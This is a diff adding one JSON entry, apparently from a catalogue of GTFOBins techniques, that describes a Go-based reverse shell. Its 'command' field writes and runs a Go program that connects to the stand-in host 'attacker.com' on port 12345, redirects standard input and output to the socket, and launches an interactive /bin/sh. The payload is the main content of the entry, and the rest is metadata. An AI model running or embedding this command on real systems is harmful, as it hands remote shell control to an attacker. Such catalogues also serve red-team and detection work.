@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-go-reverse-shell",
+  "name": "GTFOBins · go (reverse-shell)",
+  "command": "echo -e 'package main\\nimport (\\n\\t\"os\"\\n\\t\"net\"\\n\\t\"syscall\"\\n)\\n\\nfunc main(){\\n\\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\\n\\tip := net.ParseIP(\"attacker.com\").To4()\\n\\taddr := &syscall.SockaddrInet4{Port: 12345}\\n\\tcopy(addr.Addr[:], ip)\\n\\tsyscall.Connect(fd, addr)\\n\\tsyscall.Dup2(fd, 0)\\n\\tsyscall.Dup2(fd, 1)\\n\\tsyscall.Dup2(fd, 2)\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, os.Environ())\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go",
+  "description": "Use go to reverse shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "go",
+    "reverse-shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/go/#reverse-shell",
+  "upstream_id": "go/reverse-shell/0",
+  "category": "gtfobins",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/go/"
+    }
+  ]
+}
